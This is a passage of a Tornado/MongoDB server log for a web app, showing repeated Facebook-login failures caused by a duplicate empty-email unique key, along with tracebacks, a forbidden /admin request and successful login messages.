    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 124, in _on_login
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "" })
ERROR:root:500 GET /login/fb?code=AQB2kboQ33NN_jY9aNhjMXK99XKVH5tZMeHiu4OtzjefP6FkIgpwbrraScNv15kZG1GhYwUbJk9y-ZWcEoCyQJeo4WgvtIfCMO8uPdBpq5KogzMzCX5r_KemTJLE-OKOvQoM9TEo5KP1B5DzVY-Ao4u_C6LExUO60XrAi527SaOqF0CoAyBlW0sl2YcXp9Jh4MxybT1y1hPN7jTzHKeS134U (127.0.0.1) 1062.07ms
A new Facebook user is trying to login.
INFO:intheory-8003:A new Facebook user is trying to login.
ERROR:root:Uncaught exception GET /login/fb?code=AQBmnOUbv2EerS2PbGJt_L7lyYHhm9MVtjFo083HJHH0lDz9I8rP4U9jjK5FHTLQIwTljPpDAyfnfAxhkuPUeB4n7zcTUQ1ot8ZzwyEgcE0Spmycubho5NqraT61OwTfMp8yNtgbt3pTdjalLfii-G1JnJXZlEmcJ5pIdgPLnGtM8_P48qqKnIim-HF-yeplXoC7sU9hOs3ohougpWTLsD5l (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/login/fb?code=AQBmnOUbv2EerS2PbGJt_L7lyYHhm9MVtjFo083HJHH0lDz9I8rP4U9jjK5FHTLQIwTljPpDAyfnfAxhkuPUeB4n7zcTUQ1ot8ZzwyEgcE0Spmycubho5NqraT61OwTfMp8yNtgbt3pTdjalLfii-G1JnJXZlEmcJ5pIdgPLnGtM8_P48qqKnIim-HF-yeplXoC7sU9hOs3ohougpWTLsD5l', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Cookie': '__utma=188782963.1134197454.1351188036.1351188036.1351188036.1; __utmb=188782963.3.10.1351188036; __utmc=188782963; __utmz=188782963.1351188036.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=hazard%20perception%20test%20online%20free', 'Cache-Control': 'max-age=0', 'X-Real-Ip': '92.7.21.225'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 124, in _on_login
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "" })
ERROR:root:500 GET /login/fb?code=AQBmnOUbv2EerS2PbGJt_L7lyYHhm9MVtjFo083HJHH0lDz9I8rP4U9jjK5FHTLQIwTljPpDAyfnfAxhkuPUeB4n7zcTUQ1ot8ZzwyEgcE0Spmycubho5NqraT61OwTfMp8yNtgbt3pTdjalLfii-G1JnJXZlEmcJ5pIdgPLnGtM8_P48qqKnIim-HF-yeplXoC7sU9hOs3ohougpWTLsD5l (127.0.0.1) 996.81ms
A new Facebook user is trying to login.
INFO:intheory-8000:A new Facebook user is trying to login.
ERROR:root:Uncaught exception GET /login/fb?code=AQDUj_I1pBKNkFFOkvnO92XXGK-jMngcnK69GDJcBtSz5d92gdY9YfnzPC5labroWxs0lTTjDi3-jMnEkxdXkoYi3NCG9O41bOHAodrK8BQM4sXKWVwTjKI3FfiZVq-7Agcyyw4TkiNMvZgNZBEJyUZ2oCA7MIVxfc_WmojQWDJNvtrvVlHVcDuGzqKwf9cWdJjGnyAuJ7zZjK-IgCZy-_Jj (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/login/fb?code=AQDUj_I1pBKNkFFOkvnO92XXGK-jMngcnK69GDJcBtSz5d92gdY9YfnzPC5labroWxs0lTTjDi3-jMnEkxdXkoYi3NCG9O41bOHAodrK8BQM4sXKWVwTjKI3FfiZVq-7Agcyyw4TkiNMvZgNZBEJyUZ2oCA7MIVxfc_WmojQWDJNvtrvVlHVcDuGzqKwf9cWdJjGnyAuJ7zZjK-IgCZy-_Jj', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Cookie': '__utma=188782963.1134197454.1351188036.1351188036.1351188036.1; __utmb=188782963.3.10.1351188036; __utmc=188782963; __utmz=188782963.1351188036.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=hazard%20perception%20test%20online%20free', 'Cache-Control': 'max-age=0', 'X-Real-Ip': '92.7.21.225'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 124, in _on_login
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "" })
ERROR:root:500 GET /login/fb?code=AQDUj_I1pBKNkFFOkvnO92XXGK-jMngcnK69GDJcBtSz5d92gdY9YfnzPC5labroWxs0lTTjDi3-jMnEkxdXkoYi3NCG9O41bOHAodrK8BQM4sXKWVwTjKI3FfiZVq-7Agcyyw4TkiNMvZgNZBEJyUZ2oCA7MIVxfc_WmojQWDJNvtrvVlHVcDuGzqKwf9cWdJjGnyAuJ7zZjK-IgCZy-_Jj (127.0.0.1) 938.33ms
HTTP 403: Forbidden
ERROR:intheory-8001:HTTP 403: Forbidden
WARNING:root:403 GET /admin (127.0.0.1) 6.39ms
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8002:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
INFO:intheory-8000:Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
INFO:intheory-8003:Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
None is not a valid ObjectId
ERROR:intheory-8003:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8003:Ajax request failed.
Intheory user with id 508980db8e4c856f0a0ccc90 has successfully registered.
INFO:intheory-8002:Intheory user with id 508980db8e4c856f0a0ccc90 has successfully registered.
